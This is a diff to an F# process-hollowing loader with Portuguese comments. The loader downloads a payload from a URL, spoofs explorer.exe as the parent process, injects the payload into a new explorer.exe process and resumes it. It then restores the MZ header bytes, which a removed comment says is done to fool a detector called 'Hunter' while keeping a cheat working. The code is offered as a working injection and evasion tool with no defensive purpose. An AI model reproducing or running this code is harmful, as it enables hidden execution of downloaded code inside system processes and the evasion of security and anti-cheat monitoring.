@@ -57,14 +57,14 @@ let allocate (size: int) (alignment: int) =
     let allocated = Marshal.AllocHGlobal(size + (alignment / 2))
     align allocated alignment
 
-// ========== HOLLOWING ESTÁVEL ==========
+// ========== HOLLOWING ==========
 let hollow (buffer: byte[]) (hostPath: string) (parentPid: int) =
     let e_lfanew = Marshal.ReadInt32(buffer, 0x3c)
     let sizeOfImage = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x038)
     let sizeOfHeaders = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x03c)
     let entryPoint = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x10)
     let imageBase = Marshal.ReadInt64(buffer, e_lfanew + 0x18 + 0x18)
-    
+
     let pParentHandle = Marshal.AllocHGlobal(sizeof<nativeint>)
     let parentHandle = OpenProcess(0x0080u, false, parentPid)
     Marshal.WriteIntPtr(pParentHandle, parentHandle)
@@ -141,8 +141,7 @@ let hollow (buffer: byte[]) (hostPath: string) (parentPid: int) =
         SetThreadContext(threadHandle, pThreadContext) |> ignore
         ResumeThread(threadHandle) |> ignore
 
-        // RESTAURAÇÃO PARCIAL: Apenas os 2 primeiros bytes (MZ) para enganar o Hunter
-        // e não destruir os imports do cheat
+        // Espera estabilizar e restaura o MZ
         Thread.Sleep(3000) 
         
         let headerSize = 0x1000
@@ -152,7 +151,6 @@ let hollow (buffer: byte[]) (hostPath: string) (parentPid: int) =
             fs.Read(buffer, 0, headerSize) |> ignore
             buffer
 
-        // Pega só os primeiros 2 bytes (4D 5A) e devolve
         let mzBytes = originalHostHeader.[0..1]
         WriteProcessMemory(processHandle, allocAddr, mzBytes, 2u, IntPtr.Zero) |> ignore
 
@@ -168,6 +166,7 @@ let hollow (buffer: byte[]) (hostPath: string) (parentPid: int) =
         Marshal.FreeHGlobal(attrList)
         CloseHandle(parentHandle) |> ignore
 
+// ========== MAIN ==========
 let run () =
     async {
         try
@@ -177,20 +176,21 @@ let run () =
             let! bytes = client.GetByteArrayAsync(url) |> Async.AwaitTask
 
             let procs = Process.GetProcessesByName("explorer")
-            if procs.Length = 0 then failwith "Abra o Explorer!"
+            if procs.Length = 0 then failwith "Explorer não está rodando!"
             let parentPid = procs.[0].Id
 
             let hostPath = @"C:\Windows\explorer.exe"
             
             hollow bytes hostPath parentPid
             
+            // Mensagem final clean
             Console.ForegroundColor <- ConsoleColor.Green
             Console.WriteLine("\n[+] INJECTED")
             Console.ResetColor()
             
         with ex ->
             Console.ForegroundColor <- ConsoleColor.Red
-            Console.WriteLine("\n[-] FAILED: " + ex.Message)
+            Console.WriteLine("\n[-] ERRO FATAL: " + ex.Message)
             Console.ResetColor()
     }
 
